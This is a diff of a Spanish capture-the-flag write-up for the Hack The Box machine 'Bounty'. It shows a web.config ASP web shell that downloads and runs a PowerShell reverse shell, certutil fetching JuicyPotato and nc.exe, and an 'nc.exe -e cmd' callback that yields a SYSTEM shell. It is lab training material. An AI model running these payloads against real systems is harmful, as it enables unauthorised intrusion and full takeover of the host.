 Longitud: 4339 (4.2K) [text/plain]
 Grabando a: «Invoke-PowerShellTcp.ps1»
-
+-
 Invoke-PowerShellTcp.ps1          100%[============================================================>]   4.24K  --.-KB/s    en 0s      
-
+-
 2023-04-24 21:13:28 (83.7 MB/s) - «Invoke-PowerShellTcp.ps1» guardado [4339/4339]
 ```
-Dentro del **.ps1**, vamos a agregar una línea que nos recomienda el mismo Payload al final:
-```
+
+* Dentro del **.ps1**, vamos a agregar una línea que nos recomienda el mismo Payload al final:
+```powershell
     }
 }
- 
 Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port 443
 ```
 
-Ahora vamos a cambiar el **web.config**, entrando al siguiente blog, encontraremos un oneliner que nos ayudara a cargar el Payload:
-* https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html
+* Ahora vamos a cambiar el **web.config**, entrando al siguiente blog, encontraremos un oneliner que nos ayudara a cargar el Payload: https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html
 
-El oneliner será el de **ASP**:
-```
+* El oneliner será el de **ASP**, ya que ese indica el archivo:
+```powershell
 <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
 ```
-Lo copiamos y sustituimos la operación que se hizo en el **web.config**. Así debería quedar:
-```
+
+* Lo copiamos y sustituimos la operación que se hizo en el **web.config**. Así debería quedar:
+```powershell
 <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
 <%
 Set co = CreateObject("WScript.Shell")
-Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:80/Reverse_Shell.ps1')")
+Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://Tu_IP:80/Reverse_Shell.ps1')")
 output = cte.StdOut.Readall()
 Response.write(output)
 %>
 -->
 ```
-Adentro del **co.Exec** pondremos el oneliner para cargar el Payload **.ps1**.
+Adentro de la función **co.Exec** pondremos el oneliner para cargar el Payload **.ps1**.
 
-Ya tenemos todo listo, lo que sigue es cargar el **web.config** y abriremos un servidor en Python para cargar el Payload, hagamos todo por pasos:
-* Abre un servidor en Python en donde tengas el **.ps1**:
-```
+Ya tenemos todo listo, lo que sigue es cargar el **web.config** y abriremos un servidor en Python para cargar el Payload.
+
+Vamos igual por pasos:
+* Abre un servidor en **Python** en donde tengas el **.ps1**:
+```bash
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
-* Abre una netcat:
-```
+
+* Abre una **netcat**:
+```bash
 nc -nvlp 443   
 listening on [any] 443 ...
 ```
 * Carga el **web.config** y recarga la página web.
 
 * Y ya deberíamos estar conectados:
-```
+```bash
 nc -nvlp 443   
 listening on [any] 443 ...
-connect to [10.10.14.16] from (UNKNOWN) [10.10.10.93] 49158
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.93] 49158
 Windows PowerShell running as user BOUNTY$ on BOUNTY
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 PS C:\windows\system32\inetsrv>whoami
@@ -566,7 +577,7 @@ bounty\merlin
 ```
 
 Ahora, buscamos la flag del usuario:
-```
+```shell
 PS C:\windows\system32\inetsrv> cd C:\
 PS C:\> dir
     Directory: C:\
@@ -592,8 +603,9 @@ d-r--         5/30/2018   5:44 AM            Public
 PS C:\Users> cd merlin/Desktop
 PS C:\Users\merlin\Desktop> dir
 ```
-Ah kbron, no hay nada. Lo que pasa, es que se les ocurrió ocultar la flag, entonces vamos a ver los archivos ocultos:
-```
+
+No hay nada, que raro. Lo que pasa, es que se les ocurrió ocultar la flag, entonces vamos a ver los archivos ocultos:
+```shell
 PS C:\Users\merlin\Desktop> dir -Force
     Directory: C:\Users\merlin\Desktop
 
@@ -604,7 +616,7 @@ Mode                LastWriteTime     Length Name
 -arh-         4/25/2023  10:17 PM         34 user.txt                          
 PS C:\Users\merlin\Desktop> type user.txt
 ```
-Es tiempo de escalar privilegios.
+Excelente, es tiempo de escalar privilegios.
 
 
 <br>
@@ -619,8 +631,10 @@ Es tiempo de escalar privilegios.
 <br>
 
 
+<h2 id="Enum">Enumeración de Máquina Víctima</h2>
+
 Veamos qué privilegios tenemos:
-```
+```shell
 PS C:\> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -635,8 +649,11 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
-Con el **SeImpersonatePrivilege** podemos usar el **Juicy Potato**. Veamos que SO tiene la máquina:
-```
+
+Con el privilegio **SeImpersonatePrivilege** ya sabemos que podemos usar el **Juicy Potato**. 
+
+Veamos que SO tiene la máquina:
+```shell
 PS C:\> systeminfo
 
 Host Name:                 BOUNTY
@@ -652,20 +669,24 @@ Está usando **Microsoft Windows Server 2008 R2 Datacenter**. Ahora, busquemos e
 * https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 
 Descarga él **.exe**, busca una **nc.exe** y cópiala en la misma carpeta que en donde esté el **Juicy Potato**:
-```
+```bash
 locate nc.exe
 /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
 /usr/share/windows-resources/binaries/nc.exe
 cp /usr/share/windows-resources/binaries/nc.exe .
 ```
-Para cargar el **Juicy Potato** y la **nc.exe**, vamos a utilizar **certutil.exe** de la máquina víctima y abriendo un servidor de Python. Hagámoslo por pasos:
-* Abre el servidor de Python:
-```
+
+Para cargar el **Juicy Potato** y la **nc.exe**, vamos a utilizar la herramienta **certutil.exe** de la máquina víctima y abriendo un servidor de **Python**. 
+
+Hagámoslo por pasos:
+* Abre el servidor de **Python**:
+```bash
 python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+
 * En la máquina víctima, crea un directorio en el directorio **/Temp**:
-```
+```shell
 PS C:\> cd Windows/Temp
 PS C:\Windows\Temp> mkdir Privesc
     Directory: C:\Windows\Temp
@@ -675,8 +696,9 @@ d----         4/25/2023  10:46 PM            Privesc
 PS C:\Windows\Temp> cd Privesc
 PS C:\Windows\Temp\Privesc>
 ```
+
 * Usa **certutil.exe** para descargar ambos archivos:
-```
+```shell
 PS C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://10.10.14.16:8000/JuicyPotato.exe JuicyPotato.exe
 ****  Online  ****
   000000  ...
@@ -702,8 +724,9 @@ Mode                LastWriteTime     Length Name
 Listo, ahora usemos el **Juicy Potato**.
 
 <h2 id="Juicy">Usando el Juicy Potato</h2>
+
 Para ver la forma de usarlo, usemos el parámetro **-h**:
-```
+```shell
 PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -h
 JuicyPotato v0.1 
 Mandatory args: 
@@ -718,14 +741,16 @@ Optional args:
 -c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
 -z only test CLSID and print token's user
 ```
+
 Bien, ahora vamos a mandar una **cmd** como **NT Authority System** a nuestra máquina. Para esto, hagamos lo siguiente:
 * Abre una netcat:
-```
- nc -nvlp 1337
+```bash
+nc -nvlp 1337
 listening on [any] 1337 ...
 ```
+
 * Usa el siguiente oneliner usando **JuicyPotato.exe** y la **nc.exe**:
-```
+```shell
 PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.16 1337"
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 ....
@@ -733,19 +758,22 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
 [+] CreateProcessWithTokenW OK
 ```
+
 * Veamos la netcat y ya estaremos conectados:
-```
+```bash
 nc -nvlp 1337
 listening on [any] 1337 ...
-connect to [10.10.14.16] from (UNKNOWN) [10.10.10.93] 49167
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.93] 49167
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
+Afortunadamente no nos pidio un CLSID, por lo que fue más sencillo utilizar el **Juicy Potato**.
+
 * Ya solo busca la flag que te falta:
-```
+```shell
 C:\Windows\system32>cd ../../Users
 cd ../../Users
 C:\Users>dir 
@@ -800,5 +828,6 @@ Te comparto estos links sobre cómo usar el **Juicy Potato**:
 * https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 * https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
 * https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/
+
 
 # FIN
